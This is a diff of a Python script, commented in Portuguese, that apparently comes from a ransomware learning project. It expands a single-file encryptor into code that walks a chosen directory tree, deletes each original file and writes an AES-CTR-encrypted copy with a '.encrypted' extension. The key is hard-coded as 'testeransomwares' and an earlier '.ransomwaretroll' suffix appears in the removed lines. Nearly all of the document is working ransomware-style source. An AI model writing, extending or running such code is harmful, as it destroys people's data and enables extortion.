@@ -1,24 +1,57 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Função para criptografar um único arquivo
+def encrypt_file(file_path, encryption_key):
+    try:
+        # Abrir o arquivo no modo leitura binária
+        with open(file_path, "rb") as file:
+            file_data = file.read()
+        
+        # Remover o arquivo original
+        os.remove(file_path)
+        
+        # Inicializar a criptografia AES
+        aes = pyaes.AESModeOfOperationCTR(encryption_key)
+        
+        # Criptografar o conteúdo do arquivo
+        crypto_data = aes.encrypt(file_data)
+        
+        # Salvar o arquivo criptografado
+        new_file_path = file_path + ".encrypted"
+        with open(new_file_path, "wb") as encrypted_file:
+            encrypted_file.write(crypto_data)
+        
+        print(f"Arquivo criptografado: {file_path} -> {new_file_path}")
+    except Exception as e:
+        print(f"Erro ao criptografar o arquivo {file_path}: {e}")
 
-## remover o arquivo
-os.remove(file_name)
+# Função para criptografar todos os arquivos em um diretório
+def encrypt_directory(directory_path, encryption_key):
+    for root, dirs, files in os.walk(directory_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            
+            # Evitar recriptografar arquivos já criptografados
+            if not file_path.endswith(".encrypted"):
+                encrypt_file(file_path, encryption_key)
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+# Função principal
+def main():
+    # Diretório alvo para criptografar os arquivos
+    target_directory = input("Digite o diretório alvo para criptografar os arquivos: ").strip()
+    
+    # Verificar se o diretório existe
+    if not os.path.isdir(target_directory):
+        print("Diretório não encontrado!")
+        return
+    
+    # Chave de criptografia (deve ter 16, 24 ou 32 bytes)
+    encryption_key = b"testeransomwares"  # Deve ter o mesmo tamanho em todos os usos
+    
+    # Iniciar o processo de criptografia
+    encrypt_directory(target_directory, encryption_key)
+    print("Criptografia concluída!")
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+if __name__ == "__main__":
+    main()
